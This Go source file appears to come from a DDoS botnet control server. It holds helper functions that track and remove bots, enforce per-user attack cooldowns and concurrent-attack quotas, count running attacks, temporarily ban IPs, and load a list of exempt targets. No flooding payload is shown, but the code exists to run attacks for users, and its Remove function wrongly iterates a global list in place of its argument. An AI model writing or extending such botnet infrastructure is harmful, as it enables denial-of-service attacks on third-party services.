package main

import (
	"bufio"
	"log"
	"os"
	"strconv"
	"time"
)

func include(element string, array []string) bool {
	for _, item := range array {
		if element == item {
			return true
		}
	}

	return false
}

func Remove(slice []string, to_remove string) []string {
	tmp := []string{}
	for _, item := range banned_ips {
		if item != to_remove {
			tmp = append(tmp, item)
		}
	}

	return tmp
}

func remove_bot(bot *bot) {
	for i, item := range bots {
		if item.ip == bot.ip {
			bots = append(bots[:i], bots[i+1:]...)
			break
		}
	}
}

func cooldown_thread(client *user) {
	for i := 0; i != int(client.Cooldown); i++ {
		client.CooldownTime--
		time.Sleep(1 * time.Second)
	}
	client.CooldownTime = 0
}

func concurent_thread(attack_time int, client *user) {
	time.Sleep(time.Duration(attack_time) * time.Second)
	client.UsedConcurent--
}

func running_attack_thread(attack_time int) {
	running_attacks++
	time.Sleep(time.Duration(attack_time) * time.Second)
	running_attacks--
}

func temp_ban_thread(addr string, ban_time int) {
	banned_ips = append(banned_ips, addr)
	time.Sleep(time.Duration(ban_time) * time.Second)
	banned_ips = Remove(banned_ips, addr)
}

func load_blacklisted_target() {

	file, err := os.Open("blacklisted_target.txt")
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		blacklisted_target = append(blacklisted_target, scanner.Text())
	}

	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}

	log.Println("Loaded " + strconv.Itoa(len(blacklisted_target)) + " blacklisted IPs")
}

func IsBlacklistIp(addr string) bool {
	for _, item := range blacklisted_target {
		if addr == item {
			return true
		}
	}

	return false
}
